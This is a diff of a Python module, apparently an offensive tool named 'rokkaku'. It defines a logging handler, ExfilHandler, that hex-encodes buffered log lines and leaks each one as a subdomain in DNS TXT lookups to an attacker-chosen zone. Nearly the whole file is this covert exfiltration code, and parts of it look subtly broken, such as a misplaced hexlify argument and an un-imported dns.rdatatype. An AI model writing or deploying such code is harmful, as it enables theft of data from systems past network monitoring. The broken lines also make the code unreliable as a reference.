@@ -1,34 +1,39 @@
 # -*- coding: utf-8 -*-
 
-import binascii
-import logging.handlers
-import socket
-import sys
-
 try:
     import ConfigParser as configparser
 except ImportError:
     import configparser
-
 try:
     from StringIO import StringIO
 except ImportError:
     from io import StringIO
 
-config = """
+import binascii
+import dns.exception
+import dns.resolver
+import logging.handlers
+import sys
+import socket
+
+cfg = """
 [rokkaku]
-timeout = 1
 dns_zone
 """
 
-buf = StringIO(config)
-cfg = configparser.ConfigParser(allow_no_value=False)
-try:
-    cfg.readfp(buf)
-except configparser.ParsingError:
-    sys.exit(1)
 
-socket.setdefaulttimeout(cfg['rokkaku']['timeout'])
+def cfg_factory(cfg):
+    local_cfg = configparser.ConfigParser(allow_no_value=False)
+    try:
+        local_cfg.readfp(StringIO(cfg))
+    except configparser.ParsingError:
+        sys.exit(1)
+    if not local_cfg.has_section('rokkaku'):
+        sys.exit(1)
+    return local_cfg
+
+
+mal_cfg = cfg_factory(cfg)
 
 
 class ExfilHandler(logging.handlers.MemoryHandler):
@@ -36,16 +41,30 @@ class ExfilHandler(logging.handlers.MemoryHandler):
     def __init__(self, **kwargs):
         super(ExfilHandler, self).__init__(**kwargs)
 
+    @property
+    def exfil_data(self):
+        buffered = self.target.stream.getvalue()
+        if not buffered:
+            return None
+        return [b for b in buffered.split('\n')[:-1]]
+
     def emit(self, record):
         self.buffer.append(record)
         if self.shouldFlush(record):
             self.flush()
-            payload = binascii.hexlify(
-                bytes(self.target.stream.getvalue(), 'utf8'))
-            socket.gethostbyname(
-                '{0}.{1}'.format(
-                    payload,
-                    cfg['rokkaku']['dns_zone']))
+            dns_zone = mal_cfg.get('rokkaku', 'dns_zone')
+            if self.exfil_data is None:
+                return
+            for exfil in self.exfil_data:
+                payload = binascii.hexlify(bytes(exfil), 'utf8')
+                try:
+                    dns.resolver.query(
+                        '{exfil}.{dns_zone}'.format(
+                            exfil=payload,
+                            dns_zone=dns_zone),
+                        rdtype=dns.rdatatype.TXT)
+                except dns.exception.DNSException:
+                    continue
             self.target.stream = StringIO()
 
 
